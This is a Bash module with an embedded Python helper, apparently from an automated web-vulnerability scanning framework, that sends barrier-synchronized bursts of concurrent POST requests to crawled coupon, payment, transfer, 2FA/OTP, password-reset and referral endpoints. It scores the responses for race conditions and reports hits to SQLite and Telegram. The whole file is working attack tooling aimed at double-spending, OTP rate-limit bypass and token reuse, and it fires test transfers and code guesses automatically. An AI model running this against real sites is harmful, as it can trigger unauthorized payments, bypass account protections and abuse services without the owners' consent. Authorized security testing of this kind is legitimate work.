#!/usr/bin/env bash
# ============================================================
#  modules/34_race_condition.sh
#  Fase 34: Race Condition Detection
#
#  Técnicas:
#    - Barrier-synchronized burst: N requests simultáneos con
#      threading.Barrier para maximizar la ventana de colisión
#    - Targets de alto valor:
#        · Canjes de cupones/vouchers (double-spend)
#        · Rate limits de 2FA/OTP (bypass por saturación)
#        · Transferencias / pagos concurrentes
#        · Cambio de email concurrente (ATO via swap)
#        · Endpoints de un solo uso (password reset token)
#
#  El helper Python usa threading.Barrier para sincronizar exactamente
#  N workers en el mismo instante — mucho más efectivo que sleep loops.
#
#  Referencia:
#    - James Kettle "Smashing the State Machine" (BlackHat 2023)
#    - PortSwigger Web Security Academy — Race Conditions
#    - HackerOne top reports: Shopify $4750, Gitlab $12000
# ============================================================

MODULE_NAME="race_condition"
MODULE_DESC="Race Condition — barrier-synchronized burst"

# ── Helper Python (inline) ────────────────────────────────────
_write_race_helper() {
  cat > /tmp/race_burst.py << 'PYEOF'
#!/usr/bin/env python3
"""
race_burst.py — Barrier-synchronized HTTP burst para race condition testing.
Uso: python3 race_burst.py <url> <method> <body> <n_workers> <cookie>
Salida JSON: [{"status": 200, "body": "...", "elapsed": 0.12}, ...]
"""
import sys, json, time, threading
import urllib.request, urllib.parse

url      = sys.argv[1]
method   = sys.argv[2].upper()
body_str = sys.argv[3]
n        = int(sys.argv[4])
cookie   = sys.argv[5] if len(sys.argv) > 5 else ""

results = []
barrier = threading.Barrier(n)
lock    = threading.Lock()

def worker():
    try:
        data    = body_str.encode() if body_str else None
        headers = {"Content-Type": "application/x-www-form-urlencoded",
                   "User-Agent":   "Mozilla/5.0"}
        if cookie:
            headers["Cookie"] = cookie

        req = urllib.request.Request(url, data=data, headers=headers, method=method)

        barrier.wait()          # sincronizar todos los workers aquí
        t0    = time.time()
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                body  = resp.read(2000).decode(errors="replace")
                elapsed = time.time() - t0
                with lock:
                    results.append({"status": resp.status, "body": body[:500], "elapsed": elapsed})
        except urllib.error.HTTPError as e:
            body  = e.read(500).decode(errors="replace")
            elapsed = time.time() - t0
            with lock:
                results.append({"status": e.code, "body": body[:500], "elapsed": elapsed})
    except Exception as ex:
        with lock:
            results.append({"status": 0, "body": str(ex), "elapsed": 0})

threads = [threading.Thread(target=worker) for _ in range(n)]
for t in threads: t.start()
for t in threads: t.join()
print(json.dumps(results))
PYEOF
  chmod +x /tmp/race_burst.py
}

# ── Detectar si hay variación de respuestas (race ganada) ─────
# Si N requests simultáneos devuelven respuestas distintas (status/body),
# hay estado compartido sin protección → race condition probable.
_analyze_race_results() {
  local JSON="$1"
  python3 - "$JSON" << 'PYEOF'
import sys, json

data = json.loads(sys.argv[1])
if not data: sys.exit(1)

statuses = [r["status"] for r in data]
bodies   = [r["body"][:100] for r in data]

unique_statuses = set(statuses)
unique_bodies   = set(bodies)

# Señal 1: si hay más de una respuesta exitosa con mismo token (200+200)
success_count = sum(1 for s in statuses if 200 <= s < 300)

# Señal 2: respuestas mixtas (algunos 200, algunos 400/429) →
#   la protección es inconsistente bajo carga = vulnerable
mixed = len(unique_statuses) > 1 and success_count > 0

# Señal 3: keywords de éxito duplicado
success_bodies = [b for r, b in zip(data, bodies) if r["status"] < 300]
has_dup = success_count > 1 and len(set(success_bodies)) < success_count

vuln_score = 0
if success_count > 1:  vuln_score += 3
if mixed:              vuln_score += 2
if has_dup:            vuln_score += 2

result = {
    "vuln_score": vuln_score,
    "success_count": success_count,
    "mixed_responses": mixed,
    "duplicate_success": has_dup,
    "unique_statuses": list(unique_statuses),
}
print(json.dumps(result))
sys.exit(0 if vuln_score >= 3 else 1)
PYEOF
}

# ── Test de un endpoint candidato ────────────────────────────
_test_race_endpoint() {
  local URL="$1"
  local METHOD="$2"
  local BODY="$3"
  local LABEL="$4"
  local DOMAIN_ID="$5"
  local DOMAIN="$6"
  local COOKIE="${7:-}"
  local N_WORKERS="${RACE_WORKERS:-15}"

  # Bug #11: skip endpoints idempotentes (GET/HEAD, SAML/OAuth, /health, etc.)
  # Solo POST/PUT/PATCH/DELETE pueden tener race real con estado mutable.
  if type is_idempotent_endpoint &>/dev/null && is_idempotent_endpoint "$METHOD" "$URL"; then
    log_info "  Skipping race test — $METHOD $URL es idempotente (GET/SAML/OAuth/health)"
    return 1
  fi

  # Pre-check: si el endpoint redirige fuera del dominio, skip (FP por redirect a GitHub, etc.)
  local URL_DOMAIN EFF_URL
  URL_DOMAIN=$(echo "$URL" | grep -oP 'https?://\K[^/?#]+')
  EFF_URL=$(curl -sI --max-time 5 -o /dev/null -w "%{url_effective}" "$URL" 2>/dev/null)
  if [[ -n "$EFF_URL" ]] && ! echo "$EFF_URL" | grep -q "$URL_DOMAIN"; then
    log_info "  Skipping race test — $URL redirige fuera del dominio ($EFF_URL)"
    return 1
  fi

  log_info "  ⚡ Race test ($LABEL): $URL [${N_WORKERS}x]"

  local RAW_JSON
  RAW_JSON=$(python3 /tmp/race_burst.py \
    "$URL" "$METHOD" "$BODY" "$N_WORKERS" "$COOKIE" 2>/dev/null)

  [[ -z "$RAW_JSON" || "$RAW_JSON" == "[]" ]] && return 1

  local ANALYSIS
  ANALYSIS=$(_analyze_race_results "$RAW_JSON")
  local RC=$?

  if [[ $RC -eq 0 ]]; then
    local SCORE SUCCESSES MIXED
    SCORE=$(echo "$ANALYSIS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['vuln_score'])" 2>/dev/null)
    SUCCESSES=$(echo "$ANALYSIS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['success_count'])" 2>/dev/null)
    MIXED=$(echo "$ANALYSIS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['mixed_responses'])" 2>/dev/null)

    log_warn "  🏁 POSIBLE RACE CONDITION ($LABEL): $URL"
    log_warn "    Score: ${SCORE} | ${SUCCESSES} respuestas exitosas de ${N_WORKERS} workers"
    log_warn "    Respuestas mixtas: $MIXED"

    local EXISTING
    EXISTING=$(sqlite3 "$DB_PATH" \
      "SELECT COUNT(*) FROM findings
       WHERE domain_id=${DOMAIN_ID} AND target='${URL//\'/\'\'}' AND type='race_condition';" \
      2>/dev/null || echo "1")

    if [[ "${EXISTING:-1}" == "0" ]]; then
      db_add_finding "$DOMAIN_ID" "race_condition" "high" \
        "$URL" "barrier_burst" \
        "Race condition: $LABEL — ${SUCCESSES}/${N_WORKERS} respuestas exitosas concurrentes | score=${SCORE} | mixed=${MIXED}"

      _telegram_send "🏁 *Race Condition Detectada*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📋 Tipo: \`${LABEL}\`
📊 ${SUCCESSES}/${N_WORKERS} éxitos concurrentes | score=${SCORE}
💡 Verificar manualmente con cuenta real
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
    fi
    return 0
  fi

  return 1
}

# ── Encontrar candidatos de race condition ────────────────────
_find_race_candidates() {
  local DOMAIN_ID="$1"
  local OUT_FILE="$2"

  # De URLs crawleadas — rutas con semántica de estado único
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
     AND (url LIKE '%coupon%' OR url LIKE '%voucher%' OR url LIKE '%redeem%'
          OR url LIKE '%discount%' OR url LIKE '%promo%' OR url LIKE '%transfer%'
          OR url LIKE '%payment%' OR url LIKE '%checkout%' OR url LIKE '%purchase%'
          OR url LIKE '%verify%' OR url LIKE '%confirm%' OR url LIKE '%activate%'
          OR url LIKE '%2fa%' OR url LIKE '%otp%' OR url LIKE '%mfa%'
          OR url LIKE '%reset%token%' OR url LIKE '%invite%'
          OR url LIKE '%referral%' OR url LIKE '%reward%')
     LIMIT 30;" 2>/dev/null >> "$OUT_FILE"

  # De endpoints de API detectados
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
     AND (url LIKE '%/api/%' OR url LIKE '%/v1/%' OR url LIKE '%/v2/%')
     AND (url LIKE '%redeem%' OR url LIKE '%apply%' OR url LIKE '%claim%'
          OR url LIKE '%verify%' OR url LIKE '%validate%' OR url LIKE '%use%')
     LIMIT 20;" 2>/dev/null >> "$OUT_FILE"

  # Login endpoints (2FA bypass)
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM login_forms
     WHERE domain_id=${DOMAIN_ID}
     AND (login_type IN ('2fa','mfa','otp') OR url LIKE '%2fa%' OR url LIKE '%otp%'
          OR url LIKE '%verify%' OR url LIKE '%code%')
     LIMIT 10;" 2>/dev/null >> "$OUT_FILE"

  sort -u "$OUT_FILE" -o "$OUT_FILE"
}

module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 34 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  # Escribir helper Python
  _write_race_helper

  local TARGETS="$OUT_DIR/.race_targets.txt"
  > "$TARGETS"
  _find_race_candidates "$DOMAIN_ID" "$TARGETS"

  local TOTAL
  TOTAL=$(wc -l < "$TARGETS" | tr -d ' ')

  if [[ "$TOTAL" -eq 0 ]]; then
    log_info "Sin endpoints candidatos de race condition — saltando módulo"
    rm -f "$TARGETS"
    return
  fi

  log_info "$TOTAL endpoints candidatos para race condition..."
  log_info "Usando ${RACE_WORKERS:-15} workers por test (barrier sync)"

  local FOUND=0

  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    http_should_skip "$URL" 2>/dev/null && continue

    # Inferir label y body según la URL
    local LABEL="generic" BODY="test=1"
    echo "$URL" | grep -qi "coupon\|voucher\|promo\|discount" && \
      LABEL="coupon_redeem" && BODY="code=TESTRACE10"
    echo "$URL" | grep -qi "2fa\|otp\|mfa\|verify.*code\|code.*verify" && \
      LABEL="2fa_bypass" && BODY="code=000000"
    echo "$URL" | grep -qi "transfer\|payment\|checkout" && \
      LABEL="payment_race" && BODY="amount=1&to=test"
    echo "$URL" | grep -qi "reset.*token\|token.*reset" && \
      LABEL="token_reuse" && BODY="token=test_race_token"
    echo "$URL" | grep -qi "invite\|referral\|reward" && \
      LABEL="reward_claim" && BODY="code=TESTINVITE"

    _test_race_endpoint "$URL" "POST" "$BODY" "$LABEL" \
      "$DOMAIN_ID" "$DOMAIN" "" \
      && ((FOUND++))

  done < "$TARGETS"

  rm -f "$TARGETS"
  rm -f /tmp/race_burst.py

  if [[ "$FOUND" -gt 0 ]]; then
    log_ok "$MODULE_DESC: $FOUND endpoints con señales de race condition"
    log_warn "  ⚠️  VERIFICACIÓN MANUAL:"
    log_warn "  1. Usar cuenta real con el recurso (cupón, token, 2FA)"
    log_warn "  2. Lanzar N requests exactamente simultáneos con el token/código"
    log_warn "  3. Si N-1 devuelven éxito adicional → double-spend confirmado"
  else
    log_info "Sin señales de race condition en endpoints candidatos"
  fi
}
